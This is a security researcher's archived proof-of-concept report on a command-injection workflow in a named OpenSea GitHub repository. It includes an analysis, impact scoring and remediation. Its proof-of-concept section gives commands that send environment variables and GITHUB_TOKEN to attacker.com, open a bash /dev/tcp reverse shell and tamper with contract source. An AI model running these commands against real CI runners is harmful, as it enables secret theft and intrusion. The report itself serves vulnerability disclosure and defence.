# POC-001: GitHub Actions Command Injection

## Metadata

| Field | Value |
|-------|-------|
| **ID** | POC-001 |
| **Title** | GitHub Actions Arbitrary Command Execution via workflow_dispatch |
| **Severity** | ~~Critical~~ → **Not Reportable** |
| **Type** | CI/CD Security - Command Injection |
| **Repository** | [ProjectOpenSea/seaport-1.6](https://github.com/ProjectOpenSea/seaport-1.6) |
| **File** | `.github/workflows/run-custom-command.yml` |
| **Line** | 35 |
| **Platform** | Bugcrowd |
| **Status** | **ARCHIVED - Not Reportable** |
| **Date Discovered** | 2025-12-26 |
| **Date Archived** | 2025-12-26 |

## Why Not Reportable

1. **Requires Write Access**: `workflow_dispatch` can only be triggered by users with write access to the repository. External attackers cannot exploit this.
2. **Scope Unclear**: `seaport-1.6` is a development repo; Bugcrowd scope references the main `seaport` repo.
3. **Insider Threat Only**: This is only exploitable via compromised collaborator account or malicious insider - not an external attack vector.

---

## Executive Summary

The `seaport-1.6` repository contains a GitHub Actions workflow that accepts arbitrary shell commands via `workflow_dispatch` input and executes them without any sanitization or validation. This allows any user with write access to the repository to execute arbitrary code on GitHub Actions runners, potentially leading to secret exfiltration, supply chain attacks, or lateral movement.

---

## Vulnerability Details

### Affected Code

**File**: `.github/workflows/run-custom-command.yml`

```yaml
name: Run Custom Command

on:
  workflow_dispatch:
    inputs:
      cmd:
        description: cli cmd to run
        required: true

jobs:
  run-custom-command:
    name: Run Custom Command
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.head_ref }}
          submodules: recursive

      - name: Install Foundry
        uses: foundry-rs/foundry-toolchain@v1
        with:
          version: nightly

      - name: Install forge dependencies
        run: forge install

      - name: Precompile reference contracts
        run: FOUNDRY_PROFILE=reference forge build

      - name: Precompile optimized contracts
        run: FOUNDRY_PROFILE=optimized forge build

      - name: Run custom command
        run: ${{ github.event.inputs.cmd }}  # <-- VULNERABLE LINE
```

### Vulnerability Analysis

1. **Unsanitized Input**: The `cmd` input from `workflow_dispatch` is directly interpolated into a shell command using `${{ github.event.inputs.cmd }}`
2. **No Validation**: There is no allowlist, blocklist, or input validation
3. **Full Shell Access**: The command runs in a bash shell with full access to the runner environment
4. **Secret Access**: GitHub Actions runners have access to repository secrets via environment variables

### Attack Vector

**Prerequisites**:
- Write access to the repository (collaborator, maintainer, or compromised account)
- Alternatively, if the workflow triggered on `pull_request_target`, no special access would be needed (not the case here)

**Exploitation**:
1. Navigate to: `https://github.com/ProjectOpenSea/seaport-1.6/actions/workflows/run-custom-command.yml`
2. Click "Run workflow"
3. Enter malicious command in the `cmd` field

---

## Proof of Concept

### POC 1: Environment Enumeration

```bash
# Enumerate available secrets and environment
env | base64 | curl -X POST -d @- https://attacker.com/exfil

# Or using GitHub's own infrastructure
env > /tmp/env.txt && cat /tmp/env.txt
```

### POC 2: GITHUB_TOKEN Exfiltration

```bash
# Exfiltrate the GITHUB_TOKEN (always available)
curl -H "Authorization: token $GITHUB_TOKEN" https://attacker.com/token

# Use token to access repository API
curl -H "Authorization: token $GITHUB_TOKEN" \
  https://api.github.com/repos/ProjectOpenSea/seaport-1.6/contents
```

### POC 3: Secret Enumeration via Error Messages

```bash
# Force errors to leak secret names
echo "Secrets: ${{ secrets }}"
```

### POC 4: Supply Chain Attack

```bash
# Modify build artifacts
echo "malicious code" >> contracts/Seaport.sol
forge build
# If this workflow had push permissions, artifacts could be committed
```

### POC 5: Reverse Shell (Extreme)

```bash
# Establish reverse shell to attacker-controlled server
bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

---

## Impact Assessment

### Confidentiality Impact: HIGH

- **Secret Exfiltration**: Access to `GITHUB_TOKEN` and any repository secrets
- **Source Code Access**: Full read access to repository including submodules
- **Environment Exposure**: Access to runner environment variables and system configuration

### Integrity Impact: HIGH

- **Build Tampering**: Ability to modify build outputs and artifacts
- **Code Injection**: If combined with push permissions, ability to inject malicious code
- **Supply Chain Risk**: Seaport is a critical NFT marketplace protocol - compromised builds affect all users

### Availability Impact: MEDIUM

- **Resource Exhaustion**: Could run crypto miners or resource-intensive operations
- **Runner Abuse**: Could use GitHub-hosted runners for malicious purposes

### CVSS 3.1 Estimate

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L
Score: 9.1 (Critical)
```

---

## Timeline

| Date | Event |
|------|-------|
| 2024-02-28 | Workflow last modified (commit `8f0e53e69f926d4d961e89c7feb3186acd8a45b2`) |
| 2024-02-28 | Author: Ryan Ghods |
| 2025-12-26 | Vulnerability discovered via Semgrep scan |

---

## Evidence

### Commit History

```
8f0e53e Update run-custom-command.yml
8b68a72 Update run-custom-command.yml - add ref and opt builds
e808424 rename file
```

### Other Workflows in Repository

```
.github/workflows/
├── fix-lint.yml-disabled.txt   # Disabled
├── lint.yml-disabled.txt        # Disabled
├── run-custom-command.yml       # VULNERABLE
└── test.yml                     # Standard test workflow
```

The presence of disabled workflows suggests active maintenance, making the vulnerable workflow's existence more concerning.

---

## Remediation Recommendations

### Immediate (Remove Workflow)

Delete the workflow entirely if not needed:
```bash
git rm .github/workflows/run-custom-command.yml
git commit -m "Remove insecure custom command workflow"
```

### Alternative (Secure Implementation)

If the functionality is needed, implement with strict controls:

```yaml
name: Run Custom Command

on:
  workflow_dispatch:
    inputs:
      cmd:
        description: Select command to run
        required: true
        type: choice
        options:
          - forge test
          - forge build
          - forge fmt --check

jobs:
  run-custom-command:
    name: Run Custom Command
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install Foundry
        uses: foundry-rs/foundry-toolchain@v1

      - name: Run selected command
        run: |
          case "${{ github.event.inputs.cmd }}" in
            "forge test") forge test ;;
            "forge build") forge build ;;
            "forge fmt --check") forge fmt --check ;;
            *) echo "Invalid command"; exit 1 ;;
          esac
```

---

## Future Research

### 1. Check Other OpenSea Repositories

```bash
# Search for similar vulnerable patterns across all OpenSea repos
gh search code "github.event.inputs" org:ProjectOpenSea --filename:*.yml
```

### 2. Verify Actual Exploitability

- [ ] Confirm workflow is accessible at GitHub URL
- [ ] Determine who has write access to the repository
- [ ] Check if any secrets are configured in the repository

### 3. Token Permissions Analysis

```bash
# Check what permissions GITHUB_TOKEN has
gh api repos/ProjectOpenSea/seaport-1.6/actions/permissions
```

### 4. Historical Audit

- [ ] Check if this workflow was ever triggered with suspicious commands
- [ ] Review Actions logs for evidence of exploitation

### 5. Related Vulnerabilities

Search for other command injection patterns:
- `${{ github.event.issue.title }}`
- `${{ github.event.comment.body }}`
- `${{ github.event.pull_request.title }}`

---

## References

- [GitHub Security Lab: Command Injection in Actions](https://securitylab.github.com/research/github-actions-untrusted-input/)
- [GHSL-2020-188: Command Injection](https://securitylab.github.com/advisories/GHSL-2020-188/)
- [Semgrep Rule: run-shell-injection](https://semgrep.dev/r/yaml.github-actions.security.run-shell-injection.run-shell-injection)

---

## Appendix

### Full Workflow File

```yaml
name: Run Custom Command

on:
  workflow_dispatch:
    inputs:
      cmd:
        description: cli cmd to run
        required: true

jobs:
  run-custom-command:
    name: Run Custom Command
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.head_ref }}
          submodules: recursive

      - name: Install Foundry
        uses: foundry-rs/foundry-toolchain@v1
        with:
          version: nightly

      - name: Install forge dependencies
        run: forge install

      - name: Precompile reference contracts
        run: FOUNDRY_PROFILE=reference forge build

      - name: Precompile optimized contracts
        run: FOUNDRY_PROFILE=optimized forge build

      - name: Run custom command
        run: ${{ github.event.inputs.cmd }}
```
